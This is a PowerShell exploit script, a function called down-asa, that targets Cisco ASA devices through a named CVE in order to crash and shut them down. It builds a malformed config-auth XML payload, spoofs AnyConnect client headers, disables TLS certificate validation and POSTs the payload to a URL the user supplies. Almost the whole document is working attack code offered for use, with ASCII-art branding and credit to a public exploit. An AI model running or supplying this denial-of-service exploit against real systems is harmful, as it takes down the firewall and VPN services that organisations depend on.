function down-asa{
<#
.SYNOPSIS

This function will use the vulnerability CVE-2017-6736 to execute a malicious shutdown of a vulnerable cisco asa.
This is done by crafting a malicious XML packet. 
Thank you https://www.exploit-db.com/exploits/43986/
Thank you https://www.nccgroup.trust/globalassets/newsroom/uk/events/2018/02/reconbrx2018-robin-hood-vs-cisco-asa.pdf
This has not been tested, using at your own caution.

.DESCRIPTION
 (         )               )               (              
 )\ )   ( /(  (  (      ( /(        (      )\ )    (      
(()/(   )\()) )\))(   ' )\())       )\    (()/(    )\     
 /(_)) ((_)\ ((_)()\ ) ((_)\  ___((((_)(   /(_))((((_)(   
(_))_    ((_)_(())\_)() _((_)|___|)\ _ )\ (_))   )\ _ )\  
 |   \  / _ \\ \((_)/ /| \| |     (_)_\(_)/ __|  (_)_\(_) 
 | |) || (_) |\ \/\/ / | .` |      / _ \  \__ \   / _ \   
 |___/  \___/  \_/\_/  |_|\_|     /_/ \_\ |___/  /_/ \_\  
__________________________________________________________

Locate a server running a vulnerable version of a Cisco AnyConnect.

.EXAMPLE
down-asa -url https://vulnerableversion.com

.NOTES
#>
param ($url)
[string]$url = $url
# Now crafiting the custom xml to feed to the server
$payload = @('<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="a" type="a" aggregate-auth-version="a">
<host-scan-reply>A</host-scan-reply>
</config-auth>')
# Now crafting the custom header to put in the post request
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add('User-Agent', 'Open AnyConnect VPN Agent v7.08-265-gae481214-dirty')
$headers.Add('Content-Type', 'application/x-www-form-urlencoded')
$headers.Add('X-Aggregate-Auth', '1')
$headers.Add('X-Transcend-Version', '1')
$headers.Add('Accept-Encoding', 'identity')
$headers.Add('Accept', '*/*')
$headers.Add('X-AnyConnect-Platform', 'linux-64')
$headers.Add('X-Support-HTTP-Auth', 'false')
$headers.Add('X-Pad', '000000000000000000000000000000000000000')
# Now ignoring certs incase they are using a non trusted cert 
# Thank you https://grumpyneteng.com/powershell-httpsssl-and-self-signed-certificates/
Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback
    {
        public static void Ignore()
        {
            ServicePointManager.ServerCertificateValidationCallback += 
                delegate
                (
                    Object obj, 
                    X509Certificate certificate, 
                    X509Chain chain, 
                    SslPolicyErrors errors
                )
                {
                    return true;
                };
        }
    }
"@
[ServerCertificateValidationCallback]::Ignore();
# Now performing the invoke-restmethod to exploit the vulnerability 
$results = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -MaximumRedirection 0
return $results
}